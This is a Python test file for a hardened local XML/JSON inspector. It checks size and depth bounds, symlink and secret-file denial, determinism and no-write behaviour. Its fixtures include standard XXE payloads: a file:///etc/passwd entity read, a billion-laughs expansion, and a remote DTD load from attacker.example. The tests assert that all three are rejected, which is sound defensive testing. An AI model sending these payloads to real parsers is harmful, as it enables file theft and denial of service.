"""Focused serial tests for item 2ffd763d (LOCAL-FILE-INSPECTION): the
tunnel-independent, bounded single-file XML/JSON inspector in
``extensions/meridian-file-inspection``.

Import strategy: ``meridian_file_inspection`` is an independently-installable
extension (own ``pyproject.toml``, own venv when installed via
``uvx --from``) -- NOT a ``[pypi-dependencies]`` entry of the core
``meridian`` pixi env, matching the isolation boundary
``extensions/meridian-docs``/``extensions/meridian-outputs`` already
document. Unlike ``meridian-outputs`` (which needs duckdb/watchdog/tantivy/
xxhash/pyarrow/psutil -- none of them root pixi deps), this package's only
two dependencies are ``mcp`` and ``lxml``, BOTH already direct dependencies
of the root ``meridian`` pixi environment -- so, exactly like
``tests/test_docx_integrity_gate.py`` does for ``meridian_docs``, it is
imported here via a ``sys.path`` insertion rather than a declared pixi
dependency, letting these tests exercise the REAL hardened parser (including
a genuine malicious-shaped XXE/DTD fixture) instead of only checking source
text.

Covers: valid/invalid files, determinism, every bound (max_bytes, max_depth,
max_items, timeout prescan), XXE/DTD rejection, path policy (directory,
symlink, outside allowed_root, missing, secret-named), no-write behavior,
and degraded/optional capability-manifest routing.
"""
from __future__ import annotations

import hashlib
import json
import os
import sys
from pathlib import Path

import pytest

_EXT_PATH = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "..", "extensions", "meridian-file-inspection")
)
if _EXT_PATH not in sys.path:
    sys.path.insert(0, _EXT_PATH)

from meridian_file_inspection import inspector  # noqa: E402
from meridian_file_inspection.inspector import inspect_file  # noqa: E402
from meridian_file_inspection.xml_safe import XmlSecurityError, parse_secure  # noqa: E402

from meridian import capability_manifest as cm  # noqa: E402


VALID_XML = """<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:x="http://example.com/ns">
  <child id="1">Hello</child>
  <child id="2">World</child>
  <x:tagged foo="bar"/>
</root>
""".encode("utf-8")

VALID_JSON = json.dumps({"a": 1, "b": [1, 2, 3], "c": {"d": "e"}}).encode("utf-8")

# Real, standard XXE payload shapes -- fixture-only, harmless: the whole
# point of these tests is that they must NEVER be resolved/expanded, only
# rejected outright.
XXE_FILE_READ_PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ELEMENT data ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data>&xxe;</data>
"""

XXE_BILLION_LAUGHS_PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
"""

XXE_EXTERNAL_PARAMETER_ENTITY_PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">
  %remote;
]>
<data>oob</data>
"""


# ---------------------------------------------------------------------------
# Valid files
# ---------------------------------------------------------------------------

def test_valid_xml_inspects_complete(tmp_path: Path) -> None:
    p = tmp_path / "valid.xml"
    p.write_bytes(VALID_XML)
    result = inspect_file(str(p))
    assert result["state"] == "complete"
    assert result["errors"] == []
    assert result["format"] == "xml"
    assert result["shape"]["root_tag"] == "root"
    assert result["shape"]["element_tag_counts"]["child"] == 2
    assert result["shape"]["element_tag_counts"]["tagged"] == 1
    assert result["shape"]["attribute_name_counts"]["id"] == 2
    assert result["shape"]["attribute_name_counts"]["foo"] == 1
    assert "http://example.com/ns" in result["shape"]["namespace_uris"]
    assert result["source_sha256"] == hashlib.sha256(VALID_XML).hexdigest()
    assert result["result_hash"]
    assert result["provenance_ref"] is None


def test_valid_json_inspects_complete(tmp_path: Path) -> None:
    p = tmp_path / "valid.json"
    p.write_bytes(VALID_JSON)
    result = inspect_file(str(p))
    assert result["state"] == "complete"
    assert result["errors"] == []
    assert result["format"] == "json"
    assert result["shape"]["root_kind"] == "object"
    assert result["shape"]["key_count"] == 3
    assert set(result["shape"]["keys"]) == {"a", "b", "c"}


def test_format_auto_sniffs_from_magic_bytes_not_extension(tmp_path: Path) -> None:
    """A .txt-extensioned file with real JSON content is still sniffed and
    inspected correctly -- "extension plus magic/signature check, never
    extension alone" (design doc)."""
    p = tmp_path / "not_named_json.txt"
    p.write_bytes(VALID_JSON)
    result = inspect_file(str(p), format="auto")
    assert result["format"] == "json"
    assert result["state"] == "complete"


def test_unsupported_format_is_rejected(tmp_path: Path) -> None:
    p = tmp_path / "binary.bin"
    p.write_bytes(b"\x00\x01\x02\x03not xml or json")
    result = inspect_file(str(p))
    assert result["state"] == "failed"
    assert result["errors"] == [{"code": "unsupported", "reason": "format_not_recognized"}]


# ---------------------------------------------------------------------------
# XXE / DTD hardening -- the security-critical acceptance criterion
# ---------------------------------------------------------------------------

def test_xxe_external_entity_file_read_is_rejected(tmp_path: Path) -> None:
    p = tmp_path / "xxe_file_read.xml"
    p.write_bytes(XXE_FILE_READ_PAYLOAD)
    result = inspect_file(str(p))
    assert result["state"] == "failed"
    assert result["errors"] == [{"code": "denied", "reason": "dtd_disallowed",
                                  "detail": "DOCTYPE marker found in source"}]
    # Never resolved: no /etc/passwd content anywhere in the response.
    assert "root:" not in json.dumps(result)


def test_xxe_billion_laughs_is_rejected(tmp_path: Path) -> None:
    p = tmp_path / "xxe_billion_laughs.xml"
    p.write_bytes(XXE_BILLION_LAUGHS_PAYLOAD)
    result = inspect_file(str(p))
    assert result["state"] == "failed"
    assert result["errors"][0]["code"] == "denied"
    assert result["errors"][0]["reason"] == "dtd_disallowed"
    # Must reject BEFORE any entity expansion -- proven by returning
    # instantly with no element/text data, not by timing (flaky).
    assert result["shape"] == {}


def test_xxe_external_parameter_entity_is_rejected(tmp_path: Path) -> None:
    p = tmp_path / "xxe_param_entity.xml"
    p.write_bytes(XXE_EXTERNAL_PARAMETER_ENTITY_PAYLOAD)
    result = inspect_file(str(p))
    assert result["state"] == "failed"
    assert result["errors"][0]["code"] == "denied"
    assert result["errors"][0]["reason"] == "dtd_disallowed"


def test_xml_safe_parse_secure_raises_directly_for_dtd() -> None:
    """Unit-level proof (not just through the envelope) that the hardened
    parser itself refuses a DOCTYPE-bearing document."""
    with pytest.raises(XmlSecurityError) as exc_info:
        parse_secure(
            XXE_FILE_READ_PAYLOAD, max_depth=100, max_items=1000,
            preview_chars=100, timeout_seconds=5.0,
        )
    assert exc_info.value.code == "denied"
    assert exc_info.value.reason == "dtd_disallowed"


def test_secure_parser_never_resolves_entities_even_if_doctype_check_bypassed() -> None:
    """Defense-in-depth proof of layer 2/3: even calling lxml directly with
    this module's secure parser configuration (bypassing this package's own
    prescan on purpose, to isolate the parser-level protection) never
    expands the external entity -- either it refuses to parse the DOCTYPE
    at all, or the entity reference is left unresolved. It must NEVER
    contain the literal external-resource marker as expanded content."""
    import lxml.etree as LET

    from meridian_file_inspection.xml_safe import build_secure_parser

    parser = build_secure_parser()
    try:
        root = LET.fromstring(XXE_FILE_READ_PAYLOAD, parser=parser)
    except LET.XMLSyntaxError:
        return  # refused to parse at all -- also an acceptable safe outcome
    # If it parsed, the entity must be unresolved -- never file contents.
    assert root.text != "root:x:0:0:root:/root:/bin/bash"
    assert (root.text or "") in ("", "&xxe;")


# ---------------------------------------------------------------------------
# Malformed content (non-DTD)
# ---------------------------------------------------------------------------

def test_malformed_xml_is_rejected(tmp_path: Path) -> None:
    p = tmp_path / "broken.xml"
    p.write_bytes(b"<root><unclosed></root>")
    result = inspect_file(str(p))
    assert result["state"] == "failed"
    assert result["errors"][0]["code"] == "malformed"
    assert result["errors"][0]["reason"] == "xml_syntax_error"


def test_malformed_json_is_rejected(tmp_path: Path) -> None:
    p = tmp_path / "broken.json"
    p.write_bytes(b'{"a": 1, "b": }')
    result = inspect_file(str(p))
    assert result["state"] == "failed"
    assert result["errors"][0]["code"] == "malformed"
    assert result["errors"][0]["reason"] == "json_decode_error"


def test_undefined_entity_without_doctype_is_malformed_not_denied(tmp_path: Path) -> None:
    """An entity reference with NO DOCTYPE at all is simply invalid XML
    (undefined entity) -- rejected as malformed, not as a DTD finding, since
    there was never a DTD to find. Still safely rejected either way."""
    p = tmp_path / "undefined_entity.xml"
    p.write_bytes(b"<root>&undefined_entity;</root>")
    result = inspect_file(str(p))
    assert result["state"] == "failed"
    assert result["errors"][0]["code"] == "malformed"


# ---------------------------------------------------------------------------
# Bounds
# ---------------------------------------------------------------------------

def test_max_bytes_bound_rejects_oversized_file(tmp_path: Path) -> None:
    p = tmp_path / "big.json"
    p.write_bytes(VALID_JSON)
    result = inspect_file(str(p), max_bytes=4)
    assert result["state"] == "failed"
    assert result["errors"] == [{"code": "limit_exceeded", "reason": "max_bytes_exceeded",
                                  "detail": f"{len(VALID_JSON)} > 4"}]


def test_max_depth_bound_rejects_deep_json(tmp_path: Path) -> None:
    deep = [[[[[1]]]]]  # depth 5
    p = tmp_path / "deep.json"
    p.write_bytes(json.dumps(deep).encode("utf-8"))
    result = inspect_file(str(p), max_depth=3)
    assert result["state"] == "failed"
    assert result["errors"][0]["code"] == "limit_exceeded"
    assert result["errors"][0]["reason"] == "max_depth_exceeded"


def test_max_items_bound_rejects_wide_json(tmp_path: Path) -> None:
    wide = [[i] for i in range(20)]  # 1 outer + 20 inner container tokens = 21
    p = tmp_path / "wide.json"
    p.write_bytes(json.dumps(wide).encode("utf-8"))
    result = inspect_file(str(p), max_items=10)
    assert result["state"] == "failed"
    assert result["errors"][0]["code"] == "limit_exceeded"
    assert result["errors"][0]["reason"] == "max_items_exceeded"


def test_max_depth_bound_marks_xml_partial(tmp_path: Path) -> None:
    xml = b"<a><b><c><d><e>too deep</e></d></c></b></a>"
    p = tmp_path / "deep.xml"
    p.write_bytes(xml)
    result = inspect_file(str(p), max_depth=2)
    assert result["state"] == "partial"
    assert result["errors"] == []
    assert any(w["code"] == "limit_exceeded" and w["reason"] == "max_depth_exceeded"
               for w in result["warnings"])


def test_max_items_bound_marks_xml_partial(tmp_path: Path) -> None:
    xml = b"<root>" + b"".join(f"<c{i}/>".encode() for i in range(50)) + b"</root>"
    p = tmp_path / "wide.xml"
    p.write_bytes(xml)
    result = inspect_file(str(p), max_items=10)
    assert result["state"] == "partial"
    assert any(w["reason"] == "max_items_exceeded" for w in result["warnings"])


# ---------------------------------------------------------------------------
# Path policy
# ---------------------------------------------------------------------------

def test_directory_is_denied(tmp_path: Path) -> None:
    result = inspect_file(str(tmp_path))
    assert result["errors"] == [{"code": "denied", "reason": "is_a_directory"}]


def test_missing_path_is_denied(tmp_path: Path) -> None:
    result = inspect_file(str(tmp_path / "does_not_exist.json"))
    assert result["errors"] == [{"code": "denied", "reason": "not_found"}]


def test_secret_named_file_is_denied_without_being_opened(tmp_path: Path) -> None:
    p = tmp_path / ".env"
    p.write_bytes(b"SECRET_KEY=abc123")
    result = inspect_file(str(p))
    assert result["errors"] == [{"code": "denied", "reason": "secret_path_excluded"}]
    assert result["source_sha256"] is None  # never read


def test_outside_allowed_root_is_denied(tmp_path: Path) -> None:
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    outside = tmp_path / "outside.json"
    outside.write_bytes(VALID_JSON)
    result = inspect_file(str(outside), allowed_root=str(allowed))
    assert result["errors"] == [{"code": "denied", "reason": "outside_allowed_root"}]


def test_symlink_is_denied_by_default(tmp_path: Path) -> None:
    target = tmp_path / "target.json"
    target.write_bytes(VALID_JSON)
    link = tmp_path / "link.json"
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")
    result = inspect_file(str(link))
    assert result["errors"] == [{"code": "denied", "reason": "symlink_not_allowed"}]


def test_symlink_policy_branch_via_monkeypatch(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Real symlink creation needs elevated privileges on Windows (the test
    above skips there) -- this exercises the exact same policy branch in
    ``inspector._resolve_path_policy`` deterministically on every platform by
    simulating ``os.path.islink`` without touching filesystem permissions."""
    p = tmp_path / "regular.json"
    p.write_bytes(VALID_JSON)
    monkeypatch.setattr(inspector.os.path, "islink", lambda path: True)
    result = inspect_file(str(p))
    assert result["errors"] == [{"code": "denied", "reason": "symlink_not_allowed"}]

    result_allowed = inspect_file(str(p), allow_symlinks=True)
    assert result_allowed["state"] == "complete"


# ---------------------------------------------------------------------------
# Determinism
# ---------------------------------------------------------------------------

def test_result_hash_is_deterministic_across_repeated_calls(tmp_path: Path) -> None:
    p = tmp_path / "valid.xml"
    p.write_bytes(VALID_XML)
    r1 = inspect_file(str(p))
    r2 = inspect_file(str(p))
    assert r1["result_hash"] == r2["result_hash"]
    assert r1["source_sha256"] == r2["source_sha256"]
    assert r1["shape"] == r2["shape"]


def test_source_ref_never_contains_raw_absolute_path(tmp_path: Path) -> None:
    p = tmp_path / "valid.json"
    p.write_bytes(VALID_JSON)
    result = inspect_file(str(p))
    assert str(tmp_path) not in result["source_ref"]
    assert result["source_ref"].endswith("valid.json")


# ---------------------------------------------------------------------------
# Selector (optional safe selector, JSON only)
# ---------------------------------------------------------------------------

def test_json_selector_resolves_nested_value(tmp_path: Path) -> None:
    p = tmp_path / "nested.json"
    p.write_bytes(json.dumps({"a": {"b": [10, 20, 30]}}).encode("utf-8"))
    result = inspect_file(str(p), selector="a.b.1")
    assert result["state"] == "complete"
    assert result["shape"]["selected"]["root_kind"] == "number"


def test_json_selector_missing_key_reports_warning_not_crash(tmp_path: Path) -> None:
    p = tmp_path / "nested.json"
    p.write_bytes(json.dumps({"a": 1}).encode("utf-8"))
    result = inspect_file(str(p), selector="a.b.c")
    assert result["state"] == "complete"
    assert result["shape"]["selected"] is None
    assert any(w["reason"] == "selector_not_found" for w in result["warnings"])


# ---------------------------------------------------------------------------
# No-write behavior
# ---------------------------------------------------------------------------

def test_inspect_file_never_writes_anything(tmp_path: Path) -> None:
    p = tmp_path / "valid.xml"
    p.write_bytes(VALID_XML)
    before = sorted(os.listdir(tmp_path))
    before_stat = p.stat()

    inspect_file(str(p), selector=None)
    inspect_file(str(p), allowed_root=str(tmp_path), max_depth=1, max_items=1)

    after = sorted(os.listdir(tmp_path))
    after_stat = p.stat()
    assert before == after
    assert before_stat.st_mtime == after_stat.st_mtime
    assert before_stat.st_size == after_stat.st_size


# ---------------------------------------------------------------------------
# Capability manifest: local-only, degraded_ok registration
# ---------------------------------------------------------------------------

def test_capability_manifest_entry_is_schema_valid_and_degraded_ok() -> None:
    """Item 2ffd763d acceptance criterion: "Register the capability as
    local-only and optional/degraded_ok; Serena/tunnel inactivity must not
    block it." Proven structurally: the capability normalizes successfully
    against the REAL schema in meridian.capability_manifest, and
    availability_policy is preserved as "degraded_ok" -- never silently
    upgraded to "required" (which would make its absence blocking)."""
    raw = {
        "id": "local_file_inspection",
        "purpose": (
            "Inspect one local XML/JSON file's bounded structural shape, "
            "without a tunnel or Serena dependency."
        ),
        "required_tools": ["meridian-file-inspection:inspect_file"],
        "fallback_chain": [],
        "availability_policy": "degraded_ok",
    }
    normalized = cm.normalize_capability(raw)
    assert normalized["id"] == "local_file_inspection"
    assert normalized["availability_policy"] == "degraded_ok"
    assert normalized["required_tools"] == ["meridian-file-inspection:inspect_file"]

    # A full manifest containing just this capability normalizes too, and
    # has_capability_manifest reports it present.
    manifest = cm.normalize_manifest([raw])
    assert cm.has_capability_manifest(manifest) is True
    assert manifest[0]["availability_policy"] == "degraded_ok"


def test_capability_manifest_rejects_required_tools_missing() -> None:
    with pytest.raises(cm.CapabilityManifestError):
        cm.normalize_capability({
            "id": "local_file_inspection",
            "purpose": "x",
            "required_tools": [],
        })


# ---------------------------------------------------------------------------
# Sniffing internals (unit-level, no file I/O)
# ---------------------------------------------------------------------------

def test_sniff_format_prefers_magic_bytes_over_declared_mismatch() -> None:
    assert inspector.sniff_format(b'{"a":1}', "xml") == "json"
    assert inspector.sniff_format(b"<root/>", "json") == "xml"
    assert inspector.sniff_format(b"not xml or json", "auto") is None


def test_is_secret_path_matches_common_patterns() -> None:
    assert inspector.is_secret_path("/home/x/.env") is True
    assert inspector.is_secret_path("id_rsa") is True
    assert inspector.is_secret_path("config.yaml") is True
    assert inspector.is_secret_path("token_counts.csv") is False
    assert inspector.is_secret_path("valid.json") is False
